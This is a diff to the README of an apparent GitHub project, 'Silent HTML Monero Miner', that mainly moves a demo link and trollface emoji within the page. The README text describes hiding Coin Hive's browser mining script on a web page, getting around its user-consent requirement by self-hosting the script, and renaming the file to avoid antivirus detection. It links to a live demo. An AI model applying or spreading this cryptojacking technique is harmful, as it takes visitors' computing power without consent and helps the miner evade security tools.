@@ -2,14 +2,6 @@
 
 <h2>Silent HTML Monero Miner</h2>
 
- :trollface: :trollface: :trollface: :trollface: :trollface: :trollface::trollface: :trollface: :trollface: :trollface: :trollface: :trollface: :trollface: :trollface: :trollface: :trollface: :trollface: :trollface: :trollface:
-
-
-https://jonnybanana.github.io/Coin-Hive_Hidden-Miner.github.io/
-
- :trollface: :trollface: :trollface: :trollface: :trollface: :trollface::trollface: :trollface: :trollface: :trollface: :trollface: :trollface: :trollface: :trollface: :trollface: :trollface: :trollface: :trollface: :trollface:
-
-
 ![Alt text](https://raw.githubusercontent.com/JonnyBanana/Coin-Hive_Hidden-Miner.github.io/master/img/coinhive-icon.png)
 
 I have created this simple html page as a demonstration on how to make hidden the javascript miner of Coin Hive.<BR>
@@ -20,6 +12,13 @@ https://coinhive.com/lib/coinhive.min.js?v8</BR>
 https://authedmine.com/lib/authedmine.min.js?v8
 
 you will see that the user's consent will be required, but the thing is easily circumvented, in fact just host the .js file directly on the server where you host the html page you want to use for the miner, for security I also changed the file name, since now the miner is well known by the vendor antivirus and company ....
+
+:trollface: :trollface: :trollface: :trollface: :trollface: :trollface::trollface: :trollface: :trollface: :trollface: :trollface: :trollface: :trollface: :trollface: :trollface: :trollface: :trollface: :trollface: :trollface:
+
+
+https://jonnybanana.github.io/Coin-Hive_Hidden-Miner.github.io/
+
+:trollface: :trollface: :trollface: :trollface: :trollface: :trollface::trollface: :trollface: :trollface: :trollface: :trollface: :trollface: :trollface: :trollface: :trollface: :trollface: :trollface: :trollface: :trollface:
 
 <h3> Requirements </h3>
 
